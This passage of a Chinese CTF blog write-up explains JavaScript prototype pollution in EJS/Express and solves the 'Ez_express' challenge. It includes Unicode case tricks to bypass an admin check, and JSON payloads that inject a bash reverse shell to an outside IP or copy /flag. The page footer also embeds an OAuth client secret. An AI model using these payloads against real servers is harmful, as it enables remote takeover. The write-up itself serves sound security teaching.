<span class="literal">false</span>) &#123;</span><br><span class="line">        prepended +=  <span class="string">'  with ('</span> + opts.localsName + <span class="string">' || &#123;&#125;) &#123;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">        appended += <span class="string">'  &#125;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      appended += <span class="string">'  return __output.join("");'</span> + <span class="string">'\n'</span>;</span><br><span class="line">      <span class="keyword">this</span>.source = prepended + <span class="keyword">this</span>.source + appended;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (opts.compileDebug) &#123;</span><br><span class="line">      src = <span class="string">'var __line = 1'</span> + <span class="string">'\n'</span></span><br><span class="line">        + <span class="string">'  , __lines = '</span> + <span class="built_in">JSON</span>.stringify(<span class="keyword">this</span>.templateText) + <span class="string">'\n'</span></span><br><span class="line">        + <span class="string">'  , __filename = '</span> + (opts.filename ?</span><br><span class="line">        <span class="built_in">JSON</span>.stringify(opts.filename) : <span class="string">'undefined'</span>) + <span class="string">';'</span> + <span class="string">'\n'</span></span><br><span class="line">        + <span class="string">'try &#123;'</span> + <span class="string">'\n'</span></span><br><span class="line">        + <span class="keyword">this</span>.source</span><br><span class="line">        + <span class="string">'&#125; catch (e) &#123;'</span> + <span class="string">'\n'</span></span><br><span class="line">        + <span class="string">'  rethrow(e, __lines, __filename, __line, escapeFn);'</span> + <span class="string">'\n'</span></span><br><span class="line">        + <span class="string">'&#125;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      src = <span class="keyword">this</span>.source;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (opts.async) &#123;</span><br><span class="line">        <span class="comment">// Have to use generated function for this, since in envs without support,</span></span><br><span class="line">        <span class="comment">// it breaks in parsing</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          ctor = (<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'return (async function()&#123;&#125;).constructor;'</span>))();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">          <span class="keyword">if</span> (e <span class="keyword">instanceof</span> <span class="built_in">SyntaxError</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'This environment does not support async/await'</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        ctor = <span class="built_in">Function</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      fn = <span class="keyword">new</span> ctor(opts.localsName + <span class="string">', escapeFn, include, rethrow'</span>, src);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">      <span class="comment">// istanbul ignore else</span></span><br><span class="line">      <span class="keyword">if</span> (e <span class="keyword">instanceof</span> <span class="built_in">SyntaxError</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (opts.filename) &#123;</span><br><span class="line">          e.message += <span class="string">' in '</span> + opts.filename;</span><br><span class="line">        &#125;</span><br><span class="line">        e.message += <span class="string">' while compiling ejs\n\n'</span>;</span><br><span class="line">        e.message += <span class="string">'If the above error is not helpful, you may want to try EJS-Lint:\n'</span>;</span><br><span class="line">        e.message += <span class="string">'https://github.com/RyanZim/EJS-Lint'</span>;</span><br><span class="line">        <span class="keyword">if</span> (!e.async) &#123;</span><br><span class="line">          e.message += <span class="string">'\n'</span>;</span><br><span class="line">          e.message += <span class="string">'Or, if you meant to create an async function, pass async: true as an option.'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (opts.client) &#123;</span><br><span class="line">      fn.dependencies = <span class="keyword">this</span>.dependencies;</span><br><span class="line">      <span class="keyword">return</span> fn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return a callable function which will execute the function</span></span><br><span class="line">    <span class="comment">// created by the source-code, with the passed data as locals</span></span><br><span class="line">    <span class="comment">// Adds a local `include` function which allows full recursive include</span></span><br><span class="line">    <span class="keyword">var</span> returnedFn = <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> include = <span class="function"><span class="keyword">function</span> (<span class="params">path, includeData</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> d = utils.shallowCopy(&#123;&#125;, data);</span><br><span class="line">        <span class="keyword">if</span> (includeData) &#123;</span><br><span class="line">          d = utils.shallowCopy(d, includeData);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> includeFile(path, opts)(d);</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">return</span> fn.apply(opts.context, [data || &#123;&#125;, escapeFn, include, rethrow]);</span><br><span class="line">    &#125;;</span><br><span class="line">    returnedFn.dependencies = <span class="keyword">this</span>.dependencies;</span><br><span class="line">    <span class="keyword">return</span> returnedFn;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225182824684.png" alt="image-20200225182824684"></p>
+<p>compile函数中再这里先判断了outputFunctionName是否存在，如果存在就拼接到prepended,然后再传给this.source,</p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225183013346.png" alt="image-20200225183013346"></p>
+<p>这里compileDebug为TRUE,会把this.source拼接到src,</p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225183207866.png" alt="image-20200225183207866"></p>
+<p>这里涉及到Function构造函数。</p>
+<blockquote>
+<p><strong><code>Function</code> 构造函数</strong>创建一个新的 <code>Function</code> <strong>对象</strong>。直接调用此构造函数可用动态创建函数，但会遭遇来自 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/eval" target="_blank" rel="noopener"><code>eval</code></a> 的安全问题和相对较小的性能问题。然而，与 eval 不同的是，Function 构造函数只在全局作用域中运行。</p>
+<p>每个 JavaScript 函数实际上都是一个 <code>Function</code> 对象。运行 <code>(function(){}).constructor === Function</code> 便可以得到这个结论。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sum = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'return a + b'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(sum(<span class="number">2</span>, <span class="number">6</span>));</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function</a></p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225193150541.png" alt="image-20200225193150541"></p>
+<p>之后将returnedFn返回。我们可以看下compile函数中opts变量的outputFunctinName  为undefined,所以我们就可以对outputFunctionName 进行原型链污染，达到rce的效果。</p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225181608175.png" alt></p>
+<p>我们再梳理一下调用栈：</p>
+<ol>
+<li>server.js :: res.render()</li>
+<li>response.js  :: render()</li>
+<li>application.js :: render()</li>
+<li>application.js :: tryRender()</li>
+<li>view.js :: render()</li>
+<li>ejs.js ::  exports.renderFile()</li>
+<li>ejs.js :: tryHandleCache()</li>
+<li>ejs.js :: handleCache()</li>
+<li>ejs.js :: exports.compile()</li>
+<li>ejs.js :: compile()</li>
+<li>ejs.js  :: fn = new ctor(opts.localsName + ‘, escapeFn, include, rethrow’, src)</li>
+<li>ejs.js  :: fn.apply(opts.context, [data || {}, escapeFn, include, rethrow])</li>
+</ol>
+<p>然后在这道题上，我们开始利用原型链污染进行rce.</p>
+<p>payload:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"content"</span>: &#123;</span><br><span class="line">        <span class="attr">"constructor"</span>: &#123;</span><br><span class="line">            <span class="attr">"prototype"</span>: &#123;</span><br><span class="line">            <span class="attr">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/xxx/xx 0&gt;&amp;1\"');var __tmp2"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"test"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225195631671.png" alt="image-20200225195631671"></p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225195717892.png" alt="image-20200225195717892"></p>
+<h3 id="ichunqiu-新春公益赛-Ez-express"><a href="#ichunqiu-新春公益赛-Ez-express" class="headerlink" title="ichunqiu 新春公益赛 Ez_express"></a>ichunqiu 新春公益赛 Ez_express</h3><p>这道题目也给了源码，有下面几个路由：</p>
+<ul>
+<li>/   ：如果没登录会跳转到/login</li>
+<li>/login  <ul>
+<li>get  无特殊功能</li>
+<li>post  若submit为register为注册，若submit为login为登录。</li>
+</ul>
+</li>
+<li>/action : 只有admin可以用</li>
+<li>/info  ：无特殊功能</li>
+</ul>
+<p>接下来审计源码，先看routes/index.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">const</span> isObject = <span class="function"><span class="params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="built_in">Object</span>;</span><br><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.match(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.session.user)&#123;</span><br><span class="line">    res.redirect(<span class="string">'/login'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.outputFunctionName=<span class="literal">undefined</span>;</span><br><span class="line">  res.render(<span class="string">'index'</span>,data=&#123;<span class="string">'user'</span>:req.session.user.user&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/login'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">'login'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">'/login'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.body.Submit==<span class="string">"register"</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(<span class="string">"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;"</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      <span class="string">'user'</span>:req.body.userid.toUpperCase(),</span><br><span class="line">      <span class="string">'passwd'</span>: req.body.pwd,</span><br><span class="line">      <span class="string">'isLogin'</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(<span class="string">'/'</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.body.Submit==<span class="string">"login"</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.user)&#123;res.end(<span class="string">"&lt;script&gt;alert('register first');history.go(-1);&lt;/script&gt;"</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">      req.session.user.isLogin=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.end(<span class="string">"&lt;script&gt;alert('error passwd');history.go(-1);&lt;/script&gt;"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.redirect(<span class="string">'/'</span>); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">'/action'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">"ADMIN"</span>)&#123;res.end(<span class="string">"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;"</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  <span class="comment">//console.log(req.session.user.data)</span></span><br><span class="line">  <span class="comment">//console.log(res.outputFunctionName)</span></span><br><span class="line">  res.end(<span class="string">"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;"</span>);  </span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">'/info'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  </span><br><span class="line">  res.render(<span class="string">'index'</span>,data=&#123;<span class="string">'user'</span>:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到在注册的时候，safeKeyword()函数会检测禁止注册userid为admin(包括大小写)，如果通过safeKeyword()函数验证，就用toUpperCase()函数将输入的userid变成大写，赋值给session。</p>
+<p>然后再<code>/action</code>路由中通过比较req.session.user.user!=”ADMIN”来判断用户是否是admin。</p>
+<p>这里我们可以参考P神之前发的一篇关于javascript的大小写的小特性的<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">文章</a>，利用其中特性来绕过。</p>
+<blockquote>
+<p>这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。</p>
+<p>这个”K”的“小写”字符是k，也就是”K”.toLowerCase() == ‘k’.</p>
+</blockquote>
+<p>绕过这里之后，我们可以看到/action中调用了clone()函数，clone()又调用了merge()函数，这里就可以发生原型链污染。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来，我们在本地测试一下，这里是否可以进行原型链污染，</p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225215922481.png" alt="image-20200225215922481"></p>
+<p>结果是可以的，然后可以看到这里用的也是ejs的渲染引擎，然后我们继续污染outputFunctionName，来RCE。</p>
+<p>paylaod</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"constructor"</span>:&#123;<span class="attr">"prototype"</span>:&#123;<span class="attr">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/174.0.197.203/8888 0&gt;&amp;1\"');var __tmp2"</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225220249254.png" alt="image-20200225220249254"></p>
+<p>然后访问一下网页触发render()函数。在vps上收flag.</p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225220420908.png" alt="image-20200225220420908"></p>
+<p>另外也可以把flag读到读到public文件夹，</p>
+<p>payload</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"__proto__"</span>:&#123;<span class="attr">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"cat /flag&gt; /app/public/flag\"');var __tmp2"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后访问flag，即可下载。</p>
+<p>参考：</p>
+<p><a href="https://www.xmsec.cc/prototype-pollution-notes/" target="_blank" rel="noopener">https://www.xmsec.cc/prototype-pollution-notes/</a></p>
+<p><a href="https://xz.aliyun.com/t/6113" target="_blank" rel="noopener">https://xz.aliyun.com/t/6113</a></p>
+
+      
+    </div>
+  </div>
+  <!-- 要添加的内容 -->
+  
+    <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>Mount4in</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2020/02/25/原型链污染/" target="_blank" title="Javascript原型链污染">http://mount4in.github.io/2020/02/25/原型链污染/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+
+  
+  <!---->
+    <footer class="article-footer">
+      <a data-url="http://mount4in.github.io/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" data-id="clg20p60l002m14uvfuxu54en"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag">JavaScript原型链污染</a></li></ul>
+
+    </footer>
+
+
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/02/29/V/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            V&amp;N招新赛web部分题解
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">2020新春战役网络安全公益赛web部分题解</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'b7d32ae2538e1a71f462',
+      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
+      repo: 'gitalk',
+      owner: 'Mount4in',
+      admin: ['Mount4in'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2023 Mount4in</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
